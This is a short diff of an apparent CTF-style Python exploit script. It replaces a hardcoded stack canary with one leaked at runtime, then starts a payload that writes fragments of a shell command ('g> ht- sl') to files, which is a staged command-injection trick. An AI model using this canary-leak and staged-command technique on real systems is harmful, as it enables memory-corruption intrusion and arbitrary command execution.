@@ -28,8 +28,7 @@ def leak_canary():
 	return canary
 	
 
-#Canary = u32(leak_canary())
-Canary = 0x5268be00
+Canary = u32(leak_canary())
 print "[*] Canary: 0x%x"%Canary
 payload = [
 	# generate "g> ht- sl" to file "v"
